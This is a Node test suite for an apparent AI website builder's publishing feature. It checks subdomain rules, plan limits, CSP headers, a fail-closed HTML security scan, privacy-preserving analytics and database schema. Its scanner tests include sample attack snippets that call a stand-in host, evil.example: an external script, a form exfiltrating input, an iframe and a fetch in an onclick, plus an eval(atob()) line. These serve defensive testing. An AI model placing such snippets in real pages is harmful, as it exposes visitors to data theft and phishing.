// Website Hosting & Publishing (V3 Task 2) — the properties this feature
// is not allowed to lose.
//
// Publishing changes what the app IS. Up to now every byte the AI produced
// was shown to its own author inside a sandboxed iframe. A published site
// is arbitrary generated HTML served from our origin to strangers, at an
// address we hand out, forever. Four things follow, and this file asserts
// each of them:
//
//   1. The ADDRESS is a namespace we control — reserved names cannot be
//      taken, and nothing that would shadow a real route or impersonate us
//      can be registered.
//   2. The HEADERS are the sandbox. A published page runs under a CSP that
//      allows what a single-file generated site needs and nothing else.
//   3. The SCAN is fail-closed at publish time, not advisory.
//   4. The ANALYTICS cannot hold personal data, by construction.
//
// Run: node scripts/tests/publishing.test.mjs
import { readFileSync } from "node:fs";
import { schemaSql, enablesRls } from "./lib/schema-sql.mjs";

let pass = 0,
  fail = 0;
function check(name, actual, expected) {
  const a = JSON.stringify(actual),
    e = JSON.stringify(expected);
  if (a === e) {
    pass++;
    console.log(`  PASS  ${name}`);
  } else {
    fail++;
    console.log(`  FAIL  ${name}\n        expected ${e}\n        actual   ${a}`);
  }
}
function checkTrue(name, cond, detail) {
  check(name, Boolean(cond), true);
  if (!cond && detail) console.log(`        ${detail}`);
}

const { loadTs } = await import("./load-ts.mjs");
const subdomain = await loadTs("src/lib/publishing/subdomain.ts");
const limits = await loadTs("src/lib/publishing/publish-limits.ts");
const scan = await loadTs("src/lib/website-html-security-scan.ts");

const read = (f) => readFileSync(f, "utf8");

// ---------------------------------------------------------------------
console.log("== 1. the address is a namespace, not a free-for-all ==");
// ---------------------------------------------------------------------
for (const [value, why] of [
  ["acme", "a plain name"],
  ["acme-cafe", "a hyphenated name"],
  ["shop2024", "digits"],
  ["abc", "the minimum length"],
  ["a".repeat(30), "the maximum length"],
]) {
  checkTrue(`accepts "${value}" (${why})`, subdomain.validateSubdomain(value).ok);
}

for (const [value, reason, why] of [
  ["", "empty", "nothing"],
  ["ab", "too_short", "two characters"],
  ["a".repeat(31), "too_long", "31 characters"],
  ["Acme Cafe", "invalid_characters", "a space"],
  ["acme_cafe", "invalid_characters", "an underscore"],
  ["acme.cafe", "invalid_characters", "a dot"],
  ["acme/../etc", "invalid_characters", "path traversal"],
  ["-acme", "bad_edges", "a leading hyphen"],
  ["acme-", "bad_edges", "a trailing hyphen"],
  ["xn--acme", "bad_edges", "a punycode-looking double hyphen"],
]) {
  const result = subdomain.validateSubdomain(value);
  check(`refuses "${value}" (${why})`, result.ok ? "accepted" : result.reason, reason);
}

// Case and whitespace are normalised, never rejected — and what comes back
// is what gets STORED, so the row can only ever hold the canonical form.
check("uppercase is folded", subdomain.validateSubdomain("ACME").subdomain, "acme");
check("whitespace is trimmed", subdomain.validateSubdomain("  acme  ").subdomain, "acme");

// The reserved list. Each of these, in a customer's hands, is either a
// route collision or a phishing page at our own domain.
for (const reserved of [
  "www", "api", "admin", "login", "dashboard", "billing", "support",
  "security", "ionexa", "mail", "cdn", "verify", "payment", "noreply",
]) {
  const result = subdomain.validateSubdomain(reserved);
  check(`"${reserved}" is reserved`, result.ok ? "accepted" : result.reason, "reserved");
}
checkTrue("the reserved list is substantial", subdomain.RESERVED_SUBDOMAINS.size >= 60);

// Suggestions must never produce something the validator would then refuse
// — a pre-filled value the user has to fix is worse than an empty box.
for (const name of [
  "Acme Café",
  "Το Καφενείο μου",
  "  Bob's  Burgers!!  ",
  "A",
  "!!!",
  "",
  "A very long business name that definitely exceeds the limit for a subdomain",
]) {
  const suggestion = subdomain.suggestSubdomain(name);
  checkTrue(
    `a suggestion from "${name.slice(0, 30)}" is valid or empty ("${suggestion}")`,
    suggestion === "" || subdomain.validateSubdomain(suggestion).ok,
    suggestion
  );
}

// The URL shape, and the switch to real subdomains that must not require a
// data migration.
check(
  "path-based today",
  subdomain.publishedSiteUrl("acme", "https://ionexa.ai"),
  "https://ionexa.ai/s/acme"
);
check(
  "a trailing slash on the site URL does not double up",
  subdomain.publishedSiteUrl("acme", "https://ionexa.ai/"),
  "https://ionexa.ai/s/acme"
);
check(
  "a configured domain switches to a real subdomain, from the same stored row",
  subdomain.publishedSiteUrl("acme", "https://ionexa.ai", "ionexa.ai"),
  "https://acme.ionexa.ai"
);

// ---------------------------------------------------------------------
console.log("\n== 2. fair use per plan ==");
// ---------------------------------------------------------------------
check("Free publishes nothing", limits.DEFAULT_PUBLISH_LIMITS.free, 0);
check("Starter: 1", limits.DEFAULT_PUBLISH_LIMITS.starter, 1);
check("Growth: 3", limits.DEFAULT_PUBLISH_LIMITS.growth, 3);
check("Professional: 10", limits.DEFAULT_PUBLISH_LIMITS.professional, 10);
check("Ultimate: 30", limits.DEFAULT_PUBLISH_LIMITS.ultimate, 30);
checkTrue("Enterprise is unlimited", limits.DEFAULT_PUBLISH_LIMITS.enterprise === Infinity);

check("an env override applies", limits.parsePublishLimits({ PUBLISHED_SITE_LIMIT_GROWTH: "8" }).limits.growth, 8);
checkTrue(
  '"unlimited" is spellable, because Infinity is not typeable in a hosting dashboard',
  limits.parsePublishLimits({ PUBLISHED_SITE_LIMIT_STARTER: "unlimited" }).limits.starter === Infinity
);
for (const [value, why] of [
  ["lots", "not a number"],
  ["1.5", "not a whole number"],
  ["-1", "negative"],
  ["99999999", "absurd"],
]) {
  const result = limits.parsePublishLimits({ PUBLISHED_SITE_LIMIT_STARTER: value });
  check(`"${value}" is refused (${why})`, result.limits.starter, 1);
  checkTrue(`..."${value}" warns`, result.warnings.length === 1);
}
check("versions are capped", limits.MAX_SITE_VERSIONS, 20);
check("live edits per day are capped", limits.MAX_LIVE_EDITS_PER_SITE_PER_DAY, 20);

// ---------------------------------------------------------------------
console.log("\n== 3. the response headers ARE the sandbox ==");
// ---------------------------------------------------------------------
// Asserted against the source rather than by importing it: public-serving.ts
// is `server-only` and pulls in node:crypto, and what matters here is the
// literal policy text that ships.
const serving = read("src/lib/publishing/public-serving.ts");

for (const [directive, why] of [
  ["default-src 'self'", "nothing loads from a third party by default"],
  ["form-action 'self'", "a phishing page cannot POST a visitor's details to an attacker"],
  ["frame-ancestors 'none'", "the page cannot be framed for clickjacking"],
  ["base-uri 'none'", "a <base> tag cannot re-point every relative URL"],
  ["object-src 'none'", "no plugin surface"],
  ["upgrade-insecure-requests", "no mixed content"],
]) {
  checkTrue(`CSP: ${directive} — ${why}`, serving.includes(directive));
}
// The one that would undo all of the above.
checkTrue(
  "script-src does NOT allow an arbitrary external host",
  !/script-src[^"]*https:/.test(serving),
  "an https: source in script-src would let any injected <script src> execute"
);
checkTrue(
  "script-src is limited to self plus inline (single-file generated sites)",
  /script-src 'self' 'unsafe-inline'/.test(serving)
);
for (const header of [
  "X-Frame-Options",
  "X-Content-Type-Options",
  "Referrer-Policy",
  "Permissions-Policy",
]) {
  checkTrue(`${header} is set`, serving.includes(header));
}
checkTrue("the 404 is served under its own, tighter CSP", /default-src 'none'/.test(serving));
checkTrue("the 404 is not indexed", /noindex/.test(serving));

// The iframe hosts the CSP permits must be the same set the static scan
// permits — two allowlists that disagree means one of them is decoration.
const scanSrc = read("src/lib/website-html-security-scan.ts");
for (const host of ["youtube", "vimeo", "google"]) {
  checkTrue(`${host} is allowed by BOTH the scan and the CSP`, scanSrc.includes(host) && serving.includes(host));
}

// ---------------------------------------------------------------------
console.log("\n== 4. the scan is fail-closed at publish time ==");
// ---------------------------------------------------------------------
// At generation time a flagged site becomes a draft the user can
// regenerate. At publish time there is no "flag and continue" — the page
// would be live on our origin.
const publishRoute = read("src/app/api/websites/[id]/publish/route.ts");
checkTrue("publish strips external scripts", /stripDisallowedExternalScripts\(/.test(publishRoute));
checkTrue("publish scans what is left", /scanWebsiteHtmlForSecurityIssues\(/.test(publishRoute));
checkTrue(
  "...and REFUSES when anything is found",
  /issues\.length > 0[\s\S]{0,800}securityBlocked: true/.test(publishRoute)
);
checkTrue(
  "...before anything is written",
  publishRoute.indexOf("securityBlocked") < publishRoute.indexOf('.from("published_sites")\n        .insert')
    || publishRoute.indexOf("scanWebsiteHtmlForSecurityIssues(") < publishRoute.indexOf(".insert({")
);
checkTrue("the outcome is recorded either way", /logSecurityCheck\(/.test(publishRoute));

// The scanner itself, on the payloads that matter for a page served from
// our own origin.
for (const [html, why] of [
  ['<script src="https://evil.example/x.js"></script>', "an external script"],
  ['<form action="https://evil.example/collect">', "a form posting to a stranger"],
  ['<iframe src="https://evil.example/frame">', "an unknown iframe"],
  ['<div onclick="fetch(\'https://evil.example\')">', "a handler that phones home"],
  ["<script>eval(atob(x))</script>", "dynamically assembled code"],
]) {
  checkTrue(`the scan catches ${why}`, scan.scanWebsiteHtmlForSecurityIssues(html).length > 0);
}
// And does not fire on what a normal generated page contains.
check(
  "an ordinary generated page is clean",
  scan.scanWebsiteHtmlForSecurityIssues(
    `<!doctype html><html><head><style>body{color:#111}</style></head>
     <body><h1>Acme</h1><img src="https://images.unsplash.com/photo-1.jpg" alt="" />
     <button onclick="document.querySelector('.menu').classList.toggle('open')">Menu</button>
     <form action="/api/websites/abc/submit-form" method="post"><input name="email" /></form>
     <iframe src="https://www.youtube.com/embed/abc"></iframe></body></html>`
  ).length,
  0
);

// Rollback republishes, so it must scan too — "it passed last month" is
// not the claim being made when we serve it today.
const rollbackRoute = read("src/app/api/published/[id]/rollback/route.ts");
checkTrue("rollback scans before going live", /scanWebsiteHtmlForSecurityIssues\(/.test(rollbackRoute));
checkTrue("rollback refuses a version that fails", /securityBlocked: true/.test(rollbackRoute));
checkTrue(
  "rollback APPENDS a version rather than deleting history",
  /\.from\("site_versions"\)\s*\.insert\(/.test(rollbackRoute) &&
    !/\.from\("site_versions"\)[\s\S]{0,80}\.delete\(/.test(rollbackRoute)
);
checkTrue(
  "rollback requires the version to belong to THIS site",
  /\.eq\("published_site_id", publishedSiteId\)/.test(rollbackRoute)
);

// ---------------------------------------------------------------------
console.log("\n== 5. the public route ==");
// ---------------------------------------------------------------------
const publicRoute = read("src/app/s/[subdomain]/route.ts");
checkTrue("it never reads a session", !/auth\.getUser\(\)/.test(publicRoute));
checkTrue("it reads through the admin client", /createAdminClient\(\)/.test(publicRoute));
checkTrue(
  "it selects only what a visitor needs, never the whole row",
  /\.select\("id, user_id, html_content, status, is_active, updated_at"\)/.test(publicRoute)
);
checkTrue("it refuses anything that is not live", /status !== "live"/.test(publicRoute));
checkTrue("...or not active", /is_active !== true/.test(publicRoute));
checkTrue("it is rate limited before it touches the database",
  publicRoute.indexOf("publicRequestAllowed(request)") < publicRoute.indexOf("createAdminClient()"));
checkTrue("it validates the subdomain before querying",
  publicRoute.indexOf("validateSubdomain(") < publicRoute.indexOf("createAdminClient()"));
// A database error must NOT be reported as "this site does not exist" —
// that tells search engines to drop a live customer's page.
checkTrue("a database error is a 503, not a 404", /status: 503/.test(publicRoute));
checkTrue("...with Retry-After", /Retry-After/.test(publicRoute));
// The 404 must not distinguish "never existed" from "withdrawn", or it
// becomes a way to enumerate customers.
const notFoundBlock = publicRoute.slice(publicRoute.indexOf("const NOT_FOUND_HTML"));
checkTrue(
  "the 404 does not reveal whether the address was ever taken",
  !/unpublish|withdrawn|removed|expired/i.test(notFoundBlock)
);
// Awaited, NOT fire-and-forget: a serverless function is frozen when its
// response returns, so an unawaited write runs on a warm instance and
// silently never on a cold one. recordView swallows its own errors, so
// awaiting it still cannot fail the page.
checkTrue("the view write is awaited", /await recordView\(/.test(publicRoute));
checkTrue(
  "...and cannot fail the response",
  /async function recordView[\s\S]{0,900}catch \(err\)[\s\S]{0,200}logApiError/.test(publicRoute)
);
// Compare against the code, not the comment that documents the old bug.
const publicRouteCode = publicRoute.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
checkTrue("...and is not fire-and-forget", !/void recordView\(/.test(publicRouteCode));
// The Data Cache would otherwise serve a stale page and stop counting
// views — force-dynamic alone does not govern the fetches the route makes.
checkTrue("the route opts out of Next's fetch Data Cache", /fetchCache = "force-no-store"/.test(publicRouteCode));
checkTrue("...and out of route revalidation", /revalidate = 0/.test(publicRouteCode));
checkTrue("counting is one atomic RPC, not read-then-write", /rpc\("record_site_view"/.test(publicRoute));

// The middleware must not run an auth round trip on public traffic.
const middleware = read("src/middleware.ts");
checkTrue("published sites are excluded from the auth middleware", /\|s\/\|/.test(middleware));

// ---------------------------------------------------------------------
console.log("\n== 6. analytics that cannot hold personal data ==");
// ---------------------------------------------------------------------
// Was the loose `v3_website_hosting_migration.sql` at the repo root, which
// nothing ran. supabase/migrations is what builds the database.
const sql = schemaSql();
const analyticsBlock = sql.slice(
  sql.indexOf("create table if not exists public.site_analytics"),
  sql.indexOf("create unique index if not exists site_analytics_site_date_key")
);
for (const forbidden of ["ip", "user_agent", "referrer", "visitor_id", "cookie", "session", "path"]) {
  checkTrue(`site_analytics has no ${forbidden} column`, !new RegExp(`\\b${forbidden}\\b`, "i").test(analyticsBlock));
}
check(
  "it holds a date and two counters, nothing else",
  ["date", "views", "unique_visitors"].every((c) => analyticsBlock.includes(c)),
  true
);
checkTrue("no cookie is ever set on a public response", !/set-cookie|cookies\(\)/i.test(publicRoute + serving));
checkTrue(
  "the visitor fingerprint is salted, truncated and never stored",
  /createHash\("sha256"\)/.test(serving) && /\.slice\(0, 16\)/.test(serving) && !/insert.*fingerprint/i.test(serving)
);
// The limitation is stated rather than papered over.
checkTrue(
  "the per-instance limitation of unique counting is documented",
  /HONEST LIMITATION|not shared across serverless/i.test(serving)
);
// ...and the dashboard shows views, which are exact — not uniques.
const publishedPage = read("src/components/publishing/published-sites-list.tsx");
checkTrue("the dashboard shows views", /viewsThisWeek/.test(publishedPage));
checkTrue("...and does NOT present unique visitors as fact", !/unique_visitors/.test(publishedPage));

// ---------------------------------------------------------------------
console.log("\n== 7. the schema ==");
// ---------------------------------------------------------------------
checkTrue(
  "the subdomain is unique, case-insensitively",
  /create unique index[^;]*published_sites[^;]*lower\(subdomain\)/is.test(sql)
);
checkTrue(
  "one published site per website",
  /create unique index[^;]*published_sites_website_id_key[^;]*\(website_id\)/is.test(sql)
);
// Was a COUNT over a file that held only these three tables. Against the
// whole schema that number is 70 and says nothing about these three.
for (const table of ["published_sites", "site_versions", "site_analytics"]) {
  checkTrue(`${table} enables RLS`, enablesRls(sql, table));
}
checkTrue(
  "the view-counting RPC is executable only by the service role",
  /grant execute on function public\.record_site_view[^;]*to service_role/i.test(sql) &&
    /revoke all on function public\.record_site_view[^;]*from anon/i.test(sql)
);
checkTrue("the migration is idempotent", !/create table (?!if not exists)/.test(sql));
const backup = sql;
for (const table of ["published_sites", "site_versions", "site_analytics"]) {
  checkTrue(`${table} is in the full schema file`, backup.includes(`create table if not exists public.${table}`));
}

// ---------------------------------------------------------------------
console.log("\n== 8. publishing does not charge twice ==");
// ---------------------------------------------------------------------
// The HTML was generated once, paid for once, and reviewed once. Moving it
// to a URL is not a second AI action, and this asserts it never quietly
// becomes one.
checkTrue("publish makes no Anthropic call", !/messages\.(create|stream)/.test(publishRoute));
checkTrue("rollback makes no Anthropic call", !/messages\.(create|stream)/.test(rollbackRoute));
checkTrue("the public route makes no Anthropic call", !/messages\.(create|stream)/.test(publicRoute));
checkTrue("publish charges no credits", !/deductCredits|reserveCredits|settleReservation/.test(publishRoute));

// ---------------------------------------------------------------------
console.log("\n== 9. the existing Website Builder flow is not disturbed ==");
// ---------------------------------------------------------------------
// The brief for this feature is explicit that the builder must keep
// working. The integration is one import and one element, and the publish
// control owns all of its own state.
const workspace = read("src/components/website-builder/website-builder-workspace.tsx");
check("the workspace mounts the control exactly once", (workspace.match(/<PublishControl/g) ?? []).length, 1);
const control = read("src/components/publishing/publish-control.tsx");
checkTrue("the control fetches its own state", /fetch\(`\/api\/websites\/\$\{websiteId\}\/publish`\)/.test(control));
checkTrue(
  "a failed state read degrades to 'not published' rather than breaking the builder",
  /catch \{[\s\S]{0,200}A failed state read must not break the builder/.test(control)
);
checkTrue(
  "the control is disabled for a site that has not finished generating",
  /disabled=\{previewWebsite\.status !== "completed"\}/.test(workspace)
);

console.log(`\n${fail === 0 ? "ALL PASS" : "FAILURES"}: ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
